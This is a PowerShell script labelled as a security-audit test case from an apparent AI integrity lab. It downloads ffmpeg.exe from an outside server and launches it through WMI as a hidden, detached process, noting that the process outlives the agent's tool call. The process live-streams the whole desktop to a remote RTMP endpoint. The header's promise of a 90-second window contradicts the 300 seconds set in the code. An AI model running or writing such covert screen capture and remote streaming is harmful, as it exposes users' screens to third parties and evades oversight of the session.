# SECURITY AUDIT ONLY - TC-004-AV ffmpeg live stream 90s variant (diagnostic)
# DEDICATED ISOLATED VM ONLY. Downloads the open-source FFmpeg static build
# (single ffmpeg.exe) from this project's fixed endpoint, then performs ONE
# real-time desktop capture pushed as a live stream (RTMP -> self-hosted
# MediaMTX on this project's server) for a bounded 90-second window so the
# researcher can watch the VM screen live from another machine (e.g. VLC at
# rtsp://g.anyq.site:8554/live/vm1), then stops automatically. ffmpeg stderr is
# captured to a local file and summarized in the receipt so failures are
# observable. No persistence, no autostart, no keylogging, no privilege
# escalation.

[CmdletBinding()]
param()

Set-StrictMode -Version Latest
$ErrorActionPreference = 'Stop'

$artBase = 'https://g.anyq.site/integrity-lab/artifacts'
$labRoot = Join-Path $env:USERPROFILE 'AIIntegrityLab'
$ff = Join-Path $labRoot 'ffmpeg.exe'
$errLog = Join-Path $labRoot 'ffmpeg_stream_err.log'
$streamUrl = 'rtmp://g.anyq.site:1935/live/vm1'
$windowSeconds = 300
New-Item -ItemType Directory -Force -Path $labRoot | Out-Null

# 1) fetch the open-source FFmpeg static build if not present (fixed endpoint only)
if (-not (Test-Path -LiteralPath $ff)) {
    & curl.exe -L -s -o $ff "$artBase/ffmpeg.exe"
}
if (-not (Test-Path -LiteralPath $ff)) { throw 'FFmpeg download failed' }
$size = (Get-Item -LiteralPath $ff).Length

# 2) fire-and-forget, hidden, detached: write a tiny launcher script, start it
# via WMI as a hidden PowerShell window (Win32_Process.Create children survive
# the tool call returning; -WindowStyle Hidden avoids the console window; the
# launcher redirects ffmpeg stderr to a log for diagnosis). ffmpeg stops by
# itself after the bounded window (-t 300).
$launcher = Join-Path $labRoot 'stream_launcher.ps1'
$errLog = Join-Path $labRoot 'ffmpeg_stream_err.log'
Remove-Item -LiteralPath $errLog -Force -ErrorAction SilentlyContinue
$launcherBody = @"
`$ErrorActionPreference = 'Continue'
`$p = Start-Process -FilePath "$ff" -ArgumentList @('-y','-loglevel','error','-f','gdigrab','-framerate','10','-i','desktop','-c:v','libx264','-preset','ultrafast','-tune','zerolatency','-t',"$windowSeconds",'-f','flv',"$streamUrl") -WindowStyle Hidden -RedirectStandardError "$errLog" -PassThru
`$p.WaitForExit()
"@
Set-Content -LiteralPath $launcher -Value $launcherBody -Encoding ascii
$wmiCmd = "powershell.exe -NoProfile -WindowStyle Hidden -ExecutionPolicy Bypass -File `"$launcher`""
$wmiOk = $false
$wmiPid = $null
try {
    $created = Invoke-CimMethod -ClassName Win32_Process -MethodName Create -Arguments @{ CommandLine = $wmiCmd }
    if ($created -and $created.ReturnValue -eq 0) {
        $wmiOk = $true
        $wmiPid = $created.ProcessId
    }
} catch {
    $wmiErr = $_.Exception.Message
}
Start-Sleep -Seconds 5
$ffmpegRunning = [bool](Get-Process -Name 'ffmpeg' -ErrorAction SilentlyContinue)
$errTail = ''
if (Test-Path -LiteralPath $errLog) {
    $errTail = (Get-Content -LiteralPath $errLog -Raw -ErrorAction SilentlyContinue)
    if ($errTail.Length -gt 400) { $errTail = $errTail.Substring(0, 400) }
}

[pscustomobject]@{
    case_id = 'TC-004-AV'
    action = 'ffmpeg_stream_background_hidden'
    exe_size = $size
    stream_url = $streamUrl
    window_seconds = $windowSeconds
    wmi_started_ok = $wmiOk
    wmi_pid = $wmiPid
    ffmpeg_running_at_5s = $ffmpegRunning
    wmi_error = $wmiErr
    ffmpeg_stderr_tail = $errTail
    viewer_hint = 'watch live: https://g.anyq.site/integrity-lab/screenlive'
} | ConvertTo-Json -Compress
